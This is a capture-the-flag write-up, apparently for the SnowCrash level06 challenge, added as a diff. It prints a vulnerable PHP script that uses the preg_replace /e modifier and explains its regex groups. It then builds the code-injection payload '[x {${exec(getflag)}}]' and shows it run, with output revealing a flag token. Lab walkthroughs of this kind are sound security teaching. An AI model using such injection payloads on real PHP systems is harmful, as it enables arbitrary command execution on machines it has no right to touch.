@@ -1,0 +1,45 @@
+1/ level06.php:
+#!/usr/bin/php
+<?php
+
+function y($m) {
+    // replace all [] with ()
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+}
+
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    // search for pattern like [x getflag] -> when found: call function y() with getflag -> replace entier [x getflag] with result of y()
+    // replace all [] with ():
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+
+?>
+
+2/ REGEX Explanations: https://regex101.com/
+
+3/ Explanations about the concept of Group Capture
+https://www.phptutorial.net/php-tutorial/regex-capturing-groups/
+
+4/ You can see that they use the /e regex modifier that eval any paramaters given, an easily exploitable vulnerability on PHP5.2/5.3, we just have to meet the needs to the $2 replacement
+(\[x (.*)\])
+
+The first capture group is \[x (.*)\] so [x blibloublou] will match.
+The second capture group is (.*) and that what's given to the y function
+>> We can now build an exploit
+
+[x {${exec(getflag)}}]
+
+the {${exec(...)}} will execute any given command as the shell own by the user who own the script here flag06
+
+5/ level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/toto; ./level06 /tmp/toto aa
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
